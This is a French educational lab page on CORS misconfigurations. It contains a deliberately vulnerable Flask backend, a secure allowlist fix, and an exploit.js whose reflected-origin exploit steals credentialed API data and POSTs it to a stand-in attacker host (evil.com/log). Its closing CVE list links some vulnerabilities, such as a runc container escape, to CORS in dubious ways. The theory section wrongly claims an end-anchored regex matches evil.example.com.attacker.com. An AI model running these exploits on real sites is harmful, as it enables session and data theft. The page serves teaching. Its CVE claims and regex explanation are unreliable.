---
layout: default
title: "Python.CORS.Handler"
description: "Démonstration de Vulnérabilités CORS"
generated_at: "2026-03-14 14:31:40"
last_update: "2026-03-14"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>Python.CORS.Handler</span>
</div>

<div class="page-header">
  <h1>Python.CORS.Handler</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/Python.CORS.Handler" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# Démonstration de Vulnérabilités CORS

> **AVERTISSEMENT** : Ce projet est **strictement éducatif**. L'exploitation de CORS sans autorisation est illégale.

## Introduction : Le Problème de la Same-Origin Policy

Par défaut, un navigateur web applique la **Same-Origin Policy** (SOP) : un script JavaScript chargé depuis `site-a.com` ne peut pas lire les réponses HTTP de `site-b.com`. C'est une protection fondamentale qui empêche un site malveillant de voler vos données sur d'autres sites.

Mais cette restriction pose un problème légitime : comment une application moderne peut-elle appeler des APIs hébergées sur d'autres domaines ? C'est là qu'intervient **CORS** (Cross-Origin Resource Sharing).

### CORS : La Solution... et ses Pièges

CORS est un mécanisme qui permet à un serveur d'autoriser explicitement certaines origines à accéder à ses ressources. Cela se fait via des en-têtes HTTP comme `Access-Control-Allow-Origin`.

Le problème : une configuration CORS incorrecte peut **annuler complètement la protection SOP** et exposer vos données à n'importe quel site. Ce projet démontre ces vulnérabilités et comment les exploiter.

### Composants du laboratoire

| Composant | Rôle |
|-----------|------|
| `server/app.py` | Backend Flask avec différentes configurations CORS (vulnérables et sécurisées) |
| `client/exploit.js` | Scripts d'exploitation démontrant chaque vulnérabilité |
| `dns_proxy.py` | Proxy DNS pour simuler des domaines malveillants |


## Comment Fonctionne CORS

Avant de voir les vulnérabilités, comprenons le fonctionnement normal de CORS. Lorsqu'un script fait une requête vers un autre domaine, le navigateur suit un processus précis.

<div class="mermaid">
flowchart TB
    subgraph Browser["🌐 Navigateur"]
        PAGE["evil.com"]
        JS["JavaScript"]
    end

    subgraph Request["📤 Requête"]
        PREFLIGHT["OPTIONS (preflight)"]
        ACTUAL["GET/POST"]
    end

    subgraph Server["🖥️ api.example.com"]
        API["API Endpoint"]
        CORS["CORS Headers"]
    end

    PAGE --> JS
    JS -->|"Origin: evil.com"| PREFLIGHT
    PREFLIGHT --> API
    API -->|"Access-Control-Allow-Origin: *"| JS
    JS --> ACTUAL
    ACTUAL --> API

    style PAGE fill:#e74c3c,fill-opacity:0.15
    style CORS fill:#f39c12,fill-opacity:0.15
    style Server fill:#808080,fill-opacity:0.15
    style Request fill:#808080,fill-opacity:0.15
    style Browser fill:#808080,fill-opacity:0.15
</div>

**Les étapes clés** :
1. Le JavaScript sur `evil.com` veut accéder à `api.example.com`
2. Le navigateur envoie d'abord une requête **preflight** (OPTIONS) pour vérifier les autorisations
3. Le serveur répond avec les en-têtes CORS (`Access-Control-Allow-Origin`)
4. Si l'origine est autorisée, le navigateur permet la requête réelle


## Les Configurations CORS Vulnérables

Il existe plusieurs façons de mal configurer CORS. Chacune a des implications de sécurité différentes, mais toutes peuvent mener au vol de données.

<div class="mermaid">
flowchart LR
    subgraph Vulns["❌ Configurations Vulnérables"]
        V1["Access-Control-Allow-Origin: *"]
        V2["Reflect Origin sans validation"]
        V3["null origin autorisé"]
        V4["Credentials avec wildcard"]
    end

    subgraph Impact["💥 Impact"]
        I1["Vol de données"]
        I2["CSRF avancé"]
        I3["Session hijacking"]
    end

    V1 & V2 & V3 & V4 --> I1 & I2 & I3

    style V1 fill:#e74c3c,fill-opacity:0.15
    style V2 fill:#e74c3c,fill-opacity:0.15
    style V3 fill:#e74c3c,fill-opacity:0.15
    style V4 fill:#e74c3c,fill-opacity:0.15
    style Impact fill:#808080,fill-opacity:0.15
    style Vulns fill:#808080,fill-opacity:0.15
</div>

### Vulnérabilité 1 : Le Wildcard (*)

La configuration la plus dangereuse : autoriser **toutes** les origines. N'importe quel site peut lire vos données.

### Vulnérabilité 2 : Reflect Origin

Le serveur renvoie aveuglément l'en-tête `Origin` de la requête dans `Access-Control-Allow-Origin`. Si combiné avec `credentials: true`, un attaquant peut voler des sessions.

### Vulnérabilité 3 : Null Origin

Autoriser l'origine `null` semble inoffensif, mais les iframes sandboxées et certains redirects envoient cette origine. Un attaquant peut l'exploiter.


## Scénario d'Attaque Complet

Voyons maintenant comment un attaquant exploite une mauvaise configuration CORS pour voler des données bancaires. Le scénario est réaliste et démontre l'impact concret de ces vulnérabilités.

<div class="mermaid">
sequenceDiagram
    autonumber
    participant V as 👤 Victime
    participant E as 🔴 evil.com
    participant A as 🏦 api.bank.com

    V->>E: Visite evil.com
    E->>V: Page avec JS malveillant

    rect rgb(231, 76, 60, 0.2)
        Note over V,A: Exploitation CORS
        V->>A: fetch('/api/account')<br/>Origin: evil.com
        A->>A: ⚠️ Allow-Origin: *
        A-->>V: Données sensibles
        V->>E: Données exfiltrées
    end
</div>

**Déroulement de l'attaque** :
1. La victime visite un site piégé (`evil.com`)
2. Le JavaScript malveillant fait une requête vers l'API de la banque
3. Comme CORS est mal configuré, la banque renvoie les données
4. Le JavaScript exfiltre ces données vers le serveur de l'attaquant


## Code du Backend Vulnérable

Ce serveur Flask illustre trois configurations CORS vulnérables différentes. En production, **aucune de ces configurations ne devrait être utilisée**.

```python
from flask import Flask, jsonify, request

app = Flask(__name__)

# ❌ VULNÉRABLE N°1: Wildcard
# N'importe quel site peut lire ces données
@app.route('/api/public')
def public():
    response = jsonify({'data': 'public'})
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

# ❌ VULNÉRABLE N°2: Reflect Origin
# Le serveur fait confiance aveuglément à l'origine envoyée
@app.route('/api/reflect')
def reflect():
    origin = request.headers.get('Origin', '*')
    response = jsonify({'data': 'sensitive'})
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# ❌ VULNÉRABLE N°3: Null origin
# Les iframes sandboxées peuvent exploiter cette config
@app.route('/api/null')
def null_origin():
    origin = request.headers.get('Origin')
    if origin == 'null':
        response = jsonify({'data': 'from sandbox'})
        response.headers['Access-Control-Allow-Origin'] = 'null'
        return response
```


## Scripts d'Exploitation

Ces scripts JavaScript démontrent comment exploiter chaque vulnérabilité. Ils seraient hébergés sur le site de l'attaquant.

```javascript
// client/exploit.js

// Exploit 1: Wildcard
// Simple fetch - fonctionne car * autorise tout
fetch('https://api.target.com/api/public')
    .then(r => r.json())
    .then(data => console.log('Stolen:', data));

// Exploit 2: Reflect Origin avec credentials
// Le cookie de session de la victime est envoyé automatiquement
fetch('https://api.target.com/api/reflect', {
    credentials: 'include'  // Inclut les cookies de session
})
    .then(r => r.json())
    .then(data => {
        // Exfiltrer les données volées vers notre serveur
        fetch('https://evil.com/log', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });

// Exploit 3: Via iframe sandbox (null origin)
// Crée une iframe qui envoie Origin: null
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts';
iframe.srcdoc = `<script>
    fetch('https://api.target.com/api/null')
        .then(r => r.json())
        .then(data => parent.postMessage(data, '*'));
</script>`;
document.body.appendChild(iframe);
```


## Configuration CORS Sécurisée

Voici comment configurer CORS correctement. La clé est de maintenir une **liste blanche explicite** des origines autorisées.

```python
# ✅ SÉCURISÉ: Whitelist d'origins
ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com'
]

@app.route('/api/secure')
def secure():
    origin = request.headers.get('Origin')

    # Vérification explicite de l'origine
    if origin in ALLOWED_ORIGINS:
        response = jsonify({'data': 'secure'})
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        return response

    # Origine non autorisée : refuser
    return jsonify({'error': 'Forbidden'}), 403
```

**Règles d'or** :
1. **Jamais de wildcard (*)** avec `credentials: true`
2. **Jamais de reflect aveugle** de l'origine
3. **Toujours valider** l'origine contre une liste blanche
4. **Limiter les méthodes** et en-têtes autorisés au strict nécessaire


## Pour Aller Plus Loin

CORS est un sujet complexe avec de nombreuses subtilités. Voici des ressources pour approfondir :

- 📚 [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny) - Guide de sécurité
- 🌐 [MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) - Documentation technique
- 🔓 [PortSwigger CORS](https://portswigger.net/web-security/cors) - Labs pratiques et exploits


## Exploits et Vulnérabilités Connues

- **CVE-2020-5902 (F5 BIG-IP)** : Vulnérabilité critique permettant l'exécution de code à distance, aggravée par une configuration CORS permissive qui permettait l'exploitation via des requêtes cross-origin depuis n'importe quel domaine.

- **CVE-2019-5736 (Docker runc)** : Bien que non directement CORS, cette vulnérabilité illustre comment les microservices avec CORS mal configurés peuvent exposer des APIs internes à des attaquants externes.

- **HackerOne Report #168574 (Shopify)** : Configuration CORS vulnérable permettant le vol de tokens OAuth via reflect origin. Bounty de 20,000 USD pour cette découverte.

- **HackerOne Report #470298 (BitBucket)** : Mauvaise validation de l'origine permettant le vol de données de repository privés via une attaque CORS combinée à une faille de validation regex.

- **CVE-2021-21315 (Node.js systeminformation)** : Injection de commandes exploitable via CORS permissif sur des APIs d'administration système, permettant l'exécution de code arbitraire.


## Approfondissement Théorique

La Same-Origin Policy (SOP) a été introduite dans Netscape Navigator 2.0 en 1995 comme mécanisme de sécurité fondamental du web. Elle définit l'origine d'un document par le triplet (protocole, hôte, port). CORS, standardisé par le W3C, est apparu comme solution aux limitations légitimes de SOP pour les applications web modernes qui nécessitent des appels API cross-origin.

Le mécanisme de preflight CORS (requête OPTIONS) est souvent mal compris. Il n'est déclenché que pour les requêtes "non-simples" : méthodes autres que GET/HEAD/POST, headers personnalisés, ou Content-Type autres que application/x-www-form-urlencoded, multipart/form-data, text/plain. Les attaquants exploitent cette distinction en utilisant des requêtes "simples" qui ne déclenchent pas de preflight mais peuvent tout de même exfiltrer des données si la réponse contient les bons headers CORS.

Les recommandations OWASP pour CORS incluent : ne jamais utiliser le wildcard avec credentials, implémenter une validation stricte des origines (attention aux regex vulnérables comme /^https:\/\/.*\.example\.com$/ qui peut matcher evil.example.com.attacker.com), limiter les méthodes et headers autorisés, et considérer l'utilisation de tokens CSRF en plus de la validation d'origine. Les navigateurs modernes implémentent également des protections supplémentaires comme SameSite cookies qui réduisent l'impact des vulnérabilités CORS.


---

